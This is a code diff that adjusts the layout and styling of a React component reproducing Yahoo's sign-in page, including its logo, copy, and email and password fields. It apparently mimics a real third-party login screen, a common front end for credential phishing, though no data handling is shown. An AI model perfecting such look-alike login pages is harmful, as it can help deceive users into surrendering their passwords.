@@ -34,7 +34,7 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
 
   return (
     <div className="min-h-screen bg-white font-sans flex flex-col">
-      <header className="flex-shrink-0 flex justify-between items-center p-4 px-6 md:px-10">
+      <header className="flex-shrink-0 flex justify-between items-center py-4 px-10">
         <YahooLogo className="h-7" />
         <div className="flex items-center space-x-4 text-xs text-gray-600">
           <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
@@ -43,25 +43,29 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
         </div>
       </header>
 
-      <main className="flex-grow flex justify-center w-full px-4 pt-20 md:pt-24">
-        <div className="flex w-full max-w-6xl items-start justify-center">
+      {/* Main content area with corrected alignment */}
+      <main className="flex-grow w-full flex justify-center px-4 pt-24">
+        <div className="w-full max-w-7xl flex justify-between items-start">
           
-          <div className="hidden md:block w-[450px] pt-12 pr-12">
-            <h1 className="text-3xl font-semibold text-gray-900 mb-4 tracking-tight leading-snug">
+          {/* Left side text block with enough space to prevent wrapping */}
+          <div className="hidden md:block pt-12">
+            <h1 className="text-3xl font-semibold text-gray-900 mb-4 tracking-tight whitespace-nowrap">
               Yahoo makes it easy to enjoy what matters most in your world.
             </h1>
-            <p className="text-lg text-gray-600 leading-relaxed">
+            <p className="text-lg text-gray-600 leading-relaxed max-w-md">
               Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.
             </p>
           </div>
 
-          <div className="w-full max-w-sm md:w-auto md:max-w-none md:flex-shrink-0">
-            {/* The wrapper div now has the precise shadow and border radius */}
+          {/* Right side login form, pushed to the right */}
+          <div className="w-full md:w-auto flex-shrink-0">
             <div 
               className="w-full max-w-[360px] mx-auto p-8 bg-white rounded-2xl border border-gray-100"
-              style={{ boxShadow: '0 10px 50px -10px rgba(0, 0, 0, 0.1)' }}
+              style={{ boxShadow: '0 4px 60px rgba(0,0,0,.1)' }}
             >
-              <YahooLogo className="h-9 mx-auto mb-4" />
+              {/* Corrected spacing for the logo inside the card */}
+              <YahooLogo className="h-9 mx-auto mt-2 mb-6" /> 
+              
               <h2 className="text-center text-xl font-semibold text-gray-900">
                 {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
               </h2>
@@ -80,14 +84,14 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
 
                 {!showPasswordStep ? (
                   <div>
-                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-4 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
+                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-1 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
                     <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:bg-purple-300 transition-colors">
                       Next
                     </button>
                   </div>
                 ) : (
                   <div>
-                    <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-4 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
+                    <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-1 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
                      <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
                       {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                     </button>
@@ -97,10 +101,10 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
 
               <div className="text-xs mt-4 flex justify-between items-center">
                   <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
-                      <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-400 rounded focus:ring-purple-500" defaultChecked />
+                      <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
                       <span>Stay signed in</span>
                   </label>
-                  <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-purple-600 hover:underline font-medium">Forgot username?</a>
+                  <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm text-purple-600 hover:underline font-medium">Forgot username?</a>
               </div>
               
               <div className="mt-6 space-y-4">
